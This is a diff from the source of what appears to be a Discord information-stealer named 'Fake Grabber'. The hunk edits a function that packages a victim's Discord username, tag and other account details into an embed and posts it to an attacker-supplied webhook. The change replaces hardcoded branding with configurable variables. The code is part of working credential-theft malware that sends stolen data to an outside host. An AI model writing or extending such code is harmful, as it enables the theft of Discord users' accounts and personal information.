@@ -50,17 +50,17 @@ def Discord(webhook):
                 ],
             "author": {
                 "name": f"{user}#{tag}",
-                "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
+                "icon_url": f"{pfpembed}"
             },
             "footer": {
-                "text": f"Fake Grabber · Discord Information · {vbv}",
-                "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
+                "text": f"{oembed} · Discord Information · {vbv}",
+                "icon_url": f"{pfpembed}"
                 },
             "thumbnail": {}
             }
         ],
-        "avatar_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif",
-        "username": "Fake Grabber",
+        "avatar_url": f"{pfpembed}",
+        "username": f"{oembed}",
         "attachments": []
         }
     post(webhook,json=Info)
